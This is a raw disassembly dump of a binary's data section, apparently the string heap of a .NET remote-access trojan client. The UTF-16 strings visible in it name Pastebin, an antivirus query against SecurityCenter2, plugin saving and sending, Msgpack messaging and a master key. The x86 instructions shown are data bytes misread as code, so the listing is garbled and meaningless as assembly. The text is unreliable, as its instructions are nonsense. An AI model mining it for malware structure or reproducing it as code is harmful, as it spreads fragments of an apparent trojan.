  40c41b:	72 00                	jb     0x40c41d
  40c41d:	73 00                	jae    0x40c41f
  40c41f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c425:	00 0b                	add    %cl,(%ebx)
  40c427:	41                   	inc    %ecx
  40c428:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c42c:	00 69 00             	add    %ch,0x0(%ecx)
  40c42f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c430:	00 00                	add    %al,(%eax)
  40c432:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c436:	00 75 00             	add    %dh,0x0(%ebp)
  40c439:	65 00 00             	add    %al,%gs:(%eax)
  40c43c:	0b 66 00             	or     0x0(%esi),%esp
  40c43f:	61                   	popa
  40c440:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c444:	00 65 00             	add    %ah,0x0(%ebp)
  40c447:	00 17                	add    %dl,(%edi)
  40c449:	50                   	push   %eax
  40c44a:	00 65 00             	add    %ah,0x0(%ebp)
  40c44d:	72 00                	jb     0x40c44f
  40c44f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c453:	72 00                	jb     0x40c455
  40c455:	6d                   	insl   (%dx),%es:(%edi)
  40c456:	00 61 00             	add    %ah,0x0(%ecx)
  40c459:	6e                   	outsb  %ds:(%esi),(%dx)
  40c45a:	00 63 00             	add    %ah,0x0(%ebx)
  40c45d:	65 00 00             	add    %al,%gs:(%eax)
  40c460:	11 50 00             	adc    %edx,0x0(%eax)
  40c463:	61                   	popa
  40c464:	00 73 00             	add    %dh,0x0(%ebx)
  40c467:	74 00                	je     0x40c469
  40c469:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c46d:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c473:	41                   	inc    %ecx
  40c474:	00 6e 00             	add    %ch,0x0(%esi)
  40c477:	74 00                	je     0x40c479
  40c479:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c47f:	72 00                	jb     0x40c481
  40c481:	75 00                	jne    0x40c483
  40c483:	73 00                	jae    0x40c485
  40c485:	00 13                	add    %dl,(%ebx)
  40c487:	49                   	dec    %ecx
  40c488:	00 6e 00             	add    %ch,0x0(%esi)
  40c48b:	73 00                	jae    0x40c48d
  40c48d:	74 00                	je     0x40c48f
  40c48f:	61                   	popa
  40c490:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c494:	00 65 00             	add    %ah,0x0(%ebp)
  40c497:	64 00 00             	add    %al,%fs:(%eax)
  40c49a:	09 50 00             	or     %edx,0x0(%eax)
  40c49d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c49e:	00 6e 00             	add    %ch,0x0(%esi)
  40c4a1:	67 00 00             	add    %al,(%bx,%si)
  40c4a4:	0b 47 00             	or     0x0(%edi),%eax
  40c4a7:	72 00                	jb     0x40c4a9
  40c4a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4aa:	00 75 00             	add    %dh,0x0(%ebp)
  40c4ad:	70 00                	jo     0x40c4af
  40c4af:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c4b5:	00 2b                	add    %ch,(%ebx)
  40c4b7:	5c                   	pop    %esp
  40c4b8:	00 72 00             	add    %dh,0x0(%edx)
  40c4bb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4bc:	00 6f 00             	add    %ch,0x0(%edi)
  40c4bf:	74 00                	je     0x40c4c1
  40c4c1:	5c                   	pop    %esp
  40c4c2:	00 53 00             	add    %dl,0x0(%ebx)
  40c4c5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c4c9:	75 00                	jne    0x40c4cb
  40c4cb:	72 00                	jb     0x40c4cd
  40c4cd:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c4d3:	43                   	inc    %ebx
  40c4d4:	00 65 00             	add    %ah,0x0(%ebp)
  40c4d7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4d8:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4dc:	00 72 00             	add    %dh,0x0(%edx)
  40c4df:	32 00                	xor    (%eax),%al
  40c4e1:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c4e7:	6c                   	insb   (%dx),%es:(%edi)
  40c4e8:	00 65 00             	add    %ah,0x0(%ebp)
  40c4eb:	63 00                	arpl   %eax,(%eax)
  40c4ed:	74 00                	je     0x40c4ef
  40c4ef:	20 00                	and    %al,(%eax)
  40c4f1:	2a 00                	sub    (%eax),%al
  40c4f3:	20 00                	and    %al,(%eax)
  40c4f5:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c4f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40c4fd:	20 00                	and    %al,(%eax)
  40c4ff:	41                   	inc    %ecx
  40c500:	00 6e 00             	add    %ch,0x0(%esi)
  40c503:	74 00                	je     0x40c505
  40c505:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c50b:	72 00                	jb     0x40c50d
  40c50d:	75 00                	jne    0x40c50f
  40c50f:	73 00                	jae    0x40c511
  40c511:	50                   	push   %eax
  40c512:	00 72 00             	add    %dh,0x0(%edx)
  40c515:	6f                   	outsl  %ds:(%esi),(%dx)
  40c516:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c51a:	00 63 00             	add    %ah,0x0(%ebx)
  40c51d:	74 00                	je     0x40c51f
  40c51f:	00 17                	add    %dl,(%edi)
  40c521:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c525:	73 00                	jae    0x40c527
  40c527:	70 00                	jo     0x40c529
  40c529:	6c                   	insb   (%dx),%es:(%edi)
  40c52a:	00 61 00             	add    %ah,0x0(%ecx)
  40c52d:	79 00                	jns    0x40c52f
  40c52f:	4e                   	dec    %esi
  40c530:	00 61 00             	add    %ah,0x0(%ecx)
  40c533:	6d                   	insl   (%dx),%es:(%edi)
  40c534:	00 65 00             	add    %ah,0x0(%ebp)
  40c537:	00 07                	add    %al,(%edi)
  40c539:	4e                   	dec    %esi
  40c53a:	00 2f                	add    %ch,(%edi)
  40c53c:	00 41 00             	add    %al,0x0(%ecx)
  40c53f:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c545:	00 13                	add    %dl,(%ebx)
  40c547:	53                   	push   %ebx
  40c548:	00 6f 00             	add    %ch,0x0(%edi)
  40c54b:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c550:	00 61 00             	add    %ah,0x0(%ecx)
  40c553:	72 00                	jb     0x40c555
  40c555:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c55a:	09 70 00             	or     %esi,0x0(%eax)
  40c55d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c55e:	00 6e 00             	add    %ch,0x0(%esi)
  40c561:	67 00 00             	add    %al,(%bx,%si)
  40c564:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c569:	75 00                	jne    0x40c56b
  40c56b:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c56f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c570:	00 00                	add    %al,(%eax)
  40c572:	15 73 00 61 00       	adc    $0x610073,%eax
  40c577:	76 00                	jbe    0x40c579
  40c579:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c57d:	6c                   	insb   (%dx),%es:(%edi)
  40c57e:	00 75 00             	add    %dh,0x0(%ebp)
  40c581:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c585:	6e                   	outsb  %ds:(%esi),(%dx)
  40c586:	00 00                	add    %al,(%eax)
  40c588:	07                   	pop    %es
  40c589:	44                   	inc    %esp
  40c58a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c58e:	00 00                	add    %al,(%eax)
  40c590:	15 73 00 65 00       	adc    $0x650073,%eax
  40c595:	6e                   	outsb  %ds:(%esi),(%dx)
  40c596:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c59a:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c59e:	00 67 00             	add    %ah,0x0(%edi)
  40c5a1:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c5a7:	48                   	dec    %eax
  40c5a8:	00 61 00             	add    %ah,0x0(%ecx)
  40c5ab:	73 00                	jae    0x40c5ad
  40c5ad:	68 00 65 00 73       	push   $0x73006500
  40c5b2:	00 00                	add    %al,(%eax)
  40c5b4:	09 48 00             	or     %ecx,0x0(%eax)
  40c5b7:	61                   	popa
  40c5b8:	00 73 00             	add    %dh,0x0(%ebx)
  40c5bb:	68 00 00 1b 50       	push   $0x501b0000
  40c5c0:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5c4:	00 67 00             	add    %ah,0x0(%edi)
  40c5c7:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c5cd:	50                   	push   %eax
  40c5ce:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5d2:	00 67 00             	add    %ah,0x0(%edi)
  40c5d5:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c5db:	52                   	push   %edx
  40c5dc:	00 75 00             	add    %dh,0x0(%ebp)
  40c5df:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5e0:	00 00                	add    %al,(%eax)
  40c5e2:	0f 4d 00             	cmovge (%eax),%eax
  40c5e5:	73 00                	jae    0x40c5e7
  40c5e7:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c5eb:	61                   	popa
  40c5ec:	00 63 00             	add    %ah,0x0(%ebx)
  40c5ef:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c5f2:	11 52 00             	adc    %edx,0x0(%edx)
  40c5f5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c5f9:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c5fd:	76 00                	jbe    0x40c5ff
  40c5ff:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c604:	0b 45 00             	or     0x0(%ebp),%eax
  40c607:	72 00                	jb     0x40c609
  40c609:	72 00                	jb     0x40c60b
  40c60b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c60c:	00 72 00             	add    %dh,0x0(%edx)
  40c60f:	00 47 6d             	add    %al,0x6d(%edi)
  40c612:	00 61 00             	add    %ah,0x0(%ecx)
  40c615:	73 00                	jae    0x40c617
  40c617:	74 00                	je     0x40c619
  40c619:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c61d:	4b                   	dec    %ebx
  40c61e:	00 65 00             	add    %ah,0x0(%ebp)
  40c621:	79 00                	jns    0x40c623
  40c623:	20 00                	and    %al,(%eax)
  40c625:	63 00                	arpl   %eax,(%eax)
  40c627:	61                   	popa
  40c628:	00 6e 00             	add    %ch,0x0(%esi)
  40c62b:	20 00                	and    %al,(%eax)
  40c62d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c62e:	00 6f 00             	add    %ch,0x0(%edi)
  40c631:	74 00                	je     0x40c633
  40c633:	20 00                	and    %al,(%eax)
  40c635:	62 00                	bound  %eax,(%eax)
  40c637:	65 00 20             	add    %ah,%gs:(%eax)
  40c63a:	00 6e 00             	add    %ch,0x0(%esi)
  40c63d:	75 00                	jne    0x40c63f
  40c63f:	6c                   	insb   (%dx),%es:(%edi)
  40c640:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c644:	00 6f 00             	add    %ch,0x0(%edi)
  40c647:	72 00                	jb     0x40c649
  40c649:	20 00                	and    %al,(%eax)
  40c64b:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c64f:	70 00                	jo     0x40c651
  40c651:	74 00                	je     0x40c653
  40c653:	79 00                	jns    0x40c655
  40c655:	2e 00 00             	add    %al,%cs:(%eax)
  40c658:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c65d:	70 00                	jo     0x40c65f
  40c65f:	75 00                	jne    0x40c661
  40c661:	74 00                	je     0x40c663
  40c663:	20 00                	and    %al,(%eax)
  40c665:	63 00                	arpl   %eax,(%eax)
  40c667:	61                   	popa
  40c668:	00 6e 00             	add    %ch,0x0(%esi)
  40c66b:	20 00                	and    %al,(%eax)
  40c66d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c66e:	00 6f 00             	add    %ch,0x0(%edi)
  40c671:	74 00                	je     0x40c673
  40c673:	20 00                	and    %al,(%eax)
  40c675:	62 00                	bound  %eax,(%eax)
  40c677:	65 00 20             	add    %ah,%gs:(%eax)
  40c67a:	00 6e 00             	add    %ch,0x0(%esi)
  40c67d:	75 00                	jne    0x40c67f
  40c67f:	6c                   	insb   (%dx),%es:(%edi)
  40c680:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c684:	00 00                	add    %al,(%eax)
  40c686:	55                   	push   %ebp
  40c687:	49                   	dec    %ecx
  40c688:	00 6e 00             	add    %ch,0x0(%esi)
  40c68b:	76 00                	jbe    0x40c68d
  40c68d:	61                   	popa
  40c68e:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c692:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c696:	00 6d 00             	add    %ch,0x0(%ebp)
  40c699:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c69d:	73 00                	jae    0x40c69f
  40c69f:	61                   	popa
  40c6a0:	00 67 00             	add    %ah,0x0(%edi)
  40c6a3:	65 00 20             	add    %ah,%gs:(%eax)
  40c6a6:	00 61 00             	add    %ah,0x0(%ecx)
  40c6a9:	75 00                	jne    0x40c6ab
  40c6ab:	74 00                	je     0x40c6ad
  40c6ad:	68 00 65 00 6e       	push   $0x6e006500
  40c6b2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6b6:	00 63 00             	add    %ah,0x0(%ebx)
  40c6b9:	61                   	popa
  40c6ba:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6be:	00 6f 00             	add    %ch,0x0(%edi)
  40c6c1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6c2:	00 20                	add    %ah,(%eax)
  40c6c4:	00 63 00             	add    %ah,0x0(%ebx)
  40c6c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6c8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c6cc:	00 20                	add    %ah,(%eax)
  40c6ce:	00 28                	add    %ch,(%eax)
  40c6d0:	00 4d 00             	add    %cl,0x0(%ebp)
  40c6d3:	41                   	inc    %ecx
  40c6d4:	00 43 00             	add    %al,0x0(%ebx)
  40c6d7:	29 00                	sub    %eax,(%eax)
  40c6d9:	2e 00 00             	add    %al,%cs:(%eax)
  40c6dc:	05 58 00 32 00       	add    $0x320058,%eax
  40c6e1:	00 0f                	add    %cl,(%edi)
  40c6e3:	7b 00                	jnp    0x40c6e5
  40c6e5:	30 00                	xor    %al,(%eax)
  40c6e7:	3a 00                	cmp    (%eax),%al
  40c6e9:	44                   	inc    %esp
  40c6ea:	00 33                	add    %dh,(%ebx)
  40c6ec:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6ef:	20 00                	and    %al,(%eax)
  40c6f1:	00 0f                	add    %cl,(%edi)
  40c6f3:	7b 00                	jnp    0x40c6f5
  40c6f5:	30 00                	xor    %al,(%eax)
  40c6f7:	3a 00                	cmp    (%eax),%al
  40c6f9:	58                   	pop    %eax
  40c6fa:	00 32                	add    %dh,(%edx)
  40c6fc:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6ff:	20 00                	and    %al,(%eax)
  40c701:	00 2b                	add    %ch,(%ebx)
  40c703:	28 00                	sub    %al,(%eax)
  40c705:	6e                   	outsb  %ds:(%esi),(%dx)
  40c706:	00 65 00             	add    %ah,0x0(%ebp)
  40c709:	76 00                	jbe    0x40c70b
  40c70b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c70f:	20 00                	and    %al,(%eax)
  40c711:	75 00                	jne    0x40c713
  40c713:	73 00                	jae    0x40c715
  40c715:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c71a:	00 20                	add    %ah,(%eax)
  40c71c:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c720:	00 70 00             	add    %dh,0x0(%eax)
  40c723:	65 00 20             	add    %ah,%gs:(%eax)
  40c726:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c729:	63 00                	arpl   %eax,(%eax)
  40c72b:	31 00                	xor    %eax,(%eax)
  40c72d:	00 45 28             	add    %al,0x28(%ebp)
  40c730:	00 65 00             	add    %ah,0x0(%ebp)
  40c733:	78 00                	js     0x40c735
  40c735:	74 00                	je     0x40c737
  40c737:	38 00                	cmp    %al,(%eax)
  40c739:	2c 00                	sub    $0x0,%al
  40c73b:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c73f:	74 00                	je     0x40c741
  40c741:	31 00                	xor    %eax,(%eax)
  40c743:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c747:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c74b:	33 00                	xor    (%eax),%eax
  40c74d:	32 00                	xor    (%eax),%al
  40c74f:	29 00                	sub    %eax,(%eax)
  40c751:	20 00                	and    %al,(%eax)
  40c753:	74 00                	je     0x40c755
  40c755:	79 00                	jns    0x40c757
  40c757:	70 00                	jo     0x40c759
  40c759:	65 00 20             	add    %ah,%gs:(%eax)
  40c75c:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c75f:	63 00                	arpl   %eax,(%eax)
  40c761:	37                   	aaa
  40c762:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c765:	24 00                	and    $0x0,%al
  40c767:	63 00                	arpl   %eax,(%eax)
  40c769:	38 00                	cmp    %al,(%eax)
  40c76b:	2c 00                	sub    $0x0,%al
  40c76d:	24 00                	and    $0x0,%al
  40c76f:	63 00                	arpl   %eax,(%eax)
  40c771:	39 00                	cmp    %eax,(%eax)
  40c773:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c776:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c77a:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c77d:	24 f5                	and    $0xf5,%al
  40c77f:	ac                   	lods   %ds:(%esi),%al
  40c780:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c787:	7a 5c                	jp     0x40c7e5
  40c789:	56                   	push   %esi
  40c78a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c78d:	89 03                	mov    %eax,(%ebx)
  40c78f:	00 00                	add    %al,(%eax)
  40c791:	01 03                	add    %eax,(%ebx)
  40c793:	20 00                	and    %al,(%eax)
  40c795:	01 02                	add    %eax,(%edx)
  40c797:	06                   	push   %es
  40c798:	0e                   	push   %cs
  40c799:	03 06                	add    (%esi),%eax
  40c79b:	12 09                	adc    (%ecx),%cl
  40c79d:	03 06                	add    (%esi),%eax
  40c79f:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c7a3:	00 02                	add    %al,(%edx)
  40c7a5:	03 06                	add    (%esi),%eax
  40c7a7:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c7ad:	03 06                	add    (%esi),%eax
  40c7af:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c7b4:	03 06                	add    (%esi),%eax
  40c7b6:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c7bc:	06                   	push   %es
  40c7bd:	1c 02                	sbb    $0x2,%al
  40c7bf:	06                   	push   %es
  40c7c0:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7c3:	00 12                	add    %dl,(%edx)
  40c7c5:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c7ca:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c7d0:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c7d6:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c7d9:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c7df:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c7e5:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7e8:	01 01                	add    %eax,(%ecx)
  40c7ea:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7ed:	00 12                	add    %dl,(%edx)
  40c7ef:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c7f4:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c7fa:	02 03                	add    (%ebx),%al
  40c7fc:	00 00                	add    %al,(%eax)
  40c7fe:	1c 03                	sbb    $0x3,%al
  40c800:	00 00                	add    %al,(%eax)
  40c802:	08 04 00             	or     %al,(%eax,%eax,1)
  40c805:	01 01                	add    %eax,(%ecx)
  40c807:	08 04 00             	or     %al,(%eax,%eax,1)
  40c80a:	01 02                	add    %eax,(%edx)
  40c80c:	0e                   	push   %cs
  40c80d:	0a 00                	or     (%eax),%al
  40c80f:	04 02                	add    $0x2,%al
  40c811:	1c 12                	sbb    $0x12,%al
  40c813:	19 12                	sbb    %edx,(%edx)
  40c815:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c81a:	01 01                	add    %eax,(%ecx)
  40c81c:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c822:	1c 04                	sbb    $0x4,%al
  40c824:	08 00                	or     %al,(%eax)
  40c826:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c82c:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c82f:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c835:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c838:	00 12                	add    %dl,(%edx)
  40c83a:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c83f:	03 08                	add    (%eax),%ecx
  40c841:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c844:	08 00                	or     %al,(%eax)
  40c846:	08 03                	or     %al,(%ebx)
  40c848:	00 00                	add    %al,(%eax)
  40c84a:	0e                   	push   %cs
  40c84b:	04 00                	add    $0x0,%al
  40c84d:	01 0e                	add    %ecx,(%esi)
  40c84f:	0e                   	push   %cs
  40c850:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c856:	d5 0a                	aad    $0xa
  40c858:	3a 06                	cmp    (%esi),%al
  40c85a:	00 01                	add    %al,(%ecx)
  40c85c:	12 29                	adc    (%ecx),%ch
  40c85e:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c864:	03 00                	add    (%eax),%eax
  40c866:	00 18                	add    %bl,(%eax)
  40c868:	07                   	pop    %es
  40c869:	00 03                	add    %al,(%ebx)
  40c86b:	08 18                	or     %bl,(%eax)
  40c86d:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c873:	18 0e                	sbb    %cl,(%esi)
  40c875:	06                   	push   %es
  40c876:	00 02                	add    %al,(%edx)
  40c878:	02 18                	add    (%eax),%bl
  40c87a:	10 02                	adc    %al,(%edx)
  40c87c:	06                   	push   %es
  40c87d:	00 01                	add    %al,(%ecx)
  40c87f:	11 30                	adc    %esi,(%eax)
  40c881:	11 30                	adc    %esi,(%eax)
  40c883:	06                   	push   %es
  40c884:	00 03                	add    %al,(%ebx)
  40c886:	01 09                	add    %ecx,(%ecx)
  40c888:	09 09                	or     %ecx,(%ecx)
  40c88a:	02 06                	add    (%esi),%al
  40c88c:	09 03                	or     %eax,(%ebx)
  40c88e:	06                   	push   %es
  40c88f:	11 30                	adc    %esi,(%eax)
  40c891:	04 00                	add    $0x0,%al
  40c893:	00 00                	add    %al,(%eax)
  40c895:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c899:	00 00                	add    %al,(%eax)
  40c89b:	04 01                	add    $0x1,%al
  40c89d:	00 00                	add    %al,(%eax)
  40c89f:	00 06                	add    %al,(%esi)
  40c8a1:	00 02                	add    %al,(%edx)
  40c8a3:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c8a6:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c8ab:	0e                   	push   %cs
  40c8ac:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c8b1:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c8b6:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8bb:	60                   	pusha
  40c8bc:	05 00 01 01 12       	add    $0x12010100,%eax
  40c8c1:	60                   	pusha
  40c8c2:	04 00                	add    $0x0,%al
  40c8c4:	01 01                	add    %eax,(%ecx)
  40c8c6:	0e                   	push   %cs
  40c8c7:	18 06                	sbb    %al,(%esi)
  40c8c9:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c8ce:	12 49 0a             	adc    0xa(%ecx),%cl
  40c8d1:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c8d4:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c8da:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c8df:	0e                   	push   %cs
  40c8e0:	04 20                	add    $0x20,%al
  40c8e2:	00 00                	add    %al,(%eax)
  40c8e4:	00 04 40             	add    %al,(%eax,%eax,2)
  40c8e7:	00 00                	add    %al,(%eax)
  40c8e9:	00 04 10             	add    %al,(%eax,%edx,1)
  40c8ec:	00 00                	add    %al,(%eax)
  40c8ee:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c8f1:	01 01                	add    %eax,(%ecx)
  40c8f3:	0e                   	push   %cs
  40c8f4:	04 20                	add    $0x20,%al
  40c8f6:	01 0e                	add    %ecx,(%esi)
  40c8f8:	0e                   	push   %cs
  40c8f9:	06                   	push   %es
  40c8fa:	20 01                	and    %al,(%ecx)
  40c8fc:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c901:	20 02                	and    %al,(%edx)
  40c903:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c909:	00 01                	add    %al,(%ecx)
  40c90b:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c910:	06                   	push   %es
  40c911:	11 50 03             	adc    %edx,0x3(%eax)
  40c914:	06                   	push   %es
  40c915:	12 55 05             	adc    0x5(%ebp),%dl
  40c918:	00 01                	add    %al,(%ecx)
  40c91a:	0e                   	push   %cs
  40c91b:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c920:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c925:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c92b:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c931:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c937:	01 01                	add    %eax,(%ecx)
  40c939:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c93e:	60                   	pusha
  40c93f:	03 20                	add    (%eax),%esp
  40c941:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c944:	20 00                	and    %al,(%eax)
  40c946:	02 03                	add    (%ebx),%al
  40c948:	28 00                	sub    %al,(%eax)
  40c94a:	1c 03                	sbb    $0x3,%al
  40c94c:	06                   	push   %es
  40c94d:	12 60 0b             	adc    0xb(%eax),%ah
  40c950:	20 02                	and    %al,(%edx)
  40c952:	01 12                	add    %edx,(%edx)
  40c954:	60                   	pusha
  40c955:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c95a:	60                   	pusha
  40c95b:	04 20                	add    $0x20,%al
  40c95d:	00 12                	add    %dl,(%edx)
  40c95f:	60                   	pusha
  40c960:	05 20 01 12 60       	add    $0x60120120,%eax
  40c965:	0e                   	push   %cs
  40c966:	05 20 01 12 60       	add    $0x60120120,%eax
  40c96b:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c971:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c976:	60                   	pusha
  40c977:	08 03                	or     %al,(%ebx)
  40c979:	20 00                	and    %al,(%eax)
  40c97b:	08 05 28 01 12 60    	or     %al,0x60120128
  40c981:	08 03                	or     %al,(%ebx)
  40c983:	28 00                	sub    %al,(%eax)
  40c985:	08 03                	or     %al,(%ebx)
  40c987:	06                   	push   %es
  40c988:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c98c:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c990:	01 08                	add    %ecx,(%eax)
  40c992:	0e                   	push   %cs
  40c993:	05 20 01 01 12       	add    $0x12010120,%eax
  40c998:	61                   	popa
  40c999:	04 20                	add    $0x20,%al
  40c99b:	01 01                	add    %eax,(%ecx)
  40c99d:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c9a0:	01 01                	add    %eax,(%ecx)
  40c9a2:	0b 03                	or     (%ebx),%eax
  40c9a4:	20 00                	and    %al,(%eax)
  40c9a6:	0b 03                	or     (%ebx),%eax
  40c9a8:	20 00                	and    %al,(%eax)
  40c9aa:	0a 03                	or     (%ebx),%al
  40c9ac:	20 00                	and    %al,(%eax)
  40c9ae:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c9b3:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c9b8:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c9bd:	01 0e                	add    %ecx,(%esi)
  40c9bf:	0e                   	push   %cs
  40c9c0:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9c5:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c9c8:	01 02                	add    %eax,(%edx)
  40c9ca:	0e                   	push   %cs
  40c9cb:	03 20                	add    (%eax),%esp
  40c9cd:	00 0e                	add    %cl,(%esi)
  40c9cf:	04 20                	add    $0x20,%al
  40c9d1:	01 01                	add    %eax,(%ecx)
  40c9d3:	02 04 20             	add    (%eax,%eiz,1),%al
  40c9d6:	01 01                	add    %eax,(%ecx)
